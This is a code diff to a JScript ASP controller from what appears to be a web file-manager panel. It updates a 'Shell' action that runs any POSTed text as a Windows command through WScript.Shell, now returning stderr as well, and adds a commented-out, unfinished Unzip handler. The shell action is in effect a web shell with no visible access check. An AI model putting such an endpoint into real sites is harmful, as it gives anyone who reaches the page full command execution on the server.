@@ -499,9 +499,10 @@ HomeController.extend("Shell",function(){
 	if (is_post()) {
 		shell = F.post('shell');
 		if(!is_empty(shell)){
-			var cmd='cmd.exe /c '+F.string.trim(shell);
+			var cmd='%COMSPEC% /c '+F.string.trim(shell);
 			var S = new ActiveXObject("WScript.Shell");
-			content=S.exec(cmd).StdOut.ReadAll();
+			var X=S.exec(cmd);
+			content=X.StdOut.ReadAll()+X.StdErr.ReadAll();
 		}
 	}
 	this.assign("shell",shell);
@@ -511,15 +512,37 @@ HomeController.extend("Shell",function(){
 	this.display('Home:Shell');
 });
 /**
- * [description]
+ * [解压缩]
  * @Author   ZiShang520
  * @DateTime 2015-10-29T10:19:09+0800
  * @param    {[type]}                 ){	dump(IO.build('E:'));} [description]
  * @return   {[type]}                                             [description]
  */
- HomeController.extend("test",function(){
-	dump(IO.build('E:'));
-	var shell = new ActiveXObject("WScript.Shell");
-	dump(shell.exec("cmd.exe /c ").StdOut.ReadAll());
+/**未完成
+ HomeController.extend("Unzip",function(){
+	var Zip = require("zip");//引入zip组件
+	var file,content;
+	var filepath=F.decode(F.get('Path'));
+	var upaths=IO.parent(filepath);
+	var upath=(!is_empty(upaths) && IO.is(upaths) && IO.directory.exists(upaths))?Mo.U('Home/Index','Path='+F.encode(upaths)):Mo.U('Home/Drive');//生成上级路径信息
+	if (!is_empty(filepath) && IO.is(filepath) && IO.file.exists(filepath)){
+		var file=IO.file.get(filepath);
+		if (F.string.endsWith(file.type,'ZIP 压缩文件')) {
+			if (file.size<=4096000) {
+
+			}else{
+
+			}
+		}else{
+			content='该文件不是ZIP 压缩文件，请确认文件类型';
+		}
+	}else{
+		content='目标文件不存在';
+	}
+	this.assign("file",file);
+	this.assign("content",content);
+	this.assign("upath",upath);
+	this.display('Home:File');
  });
+*/
 </script>
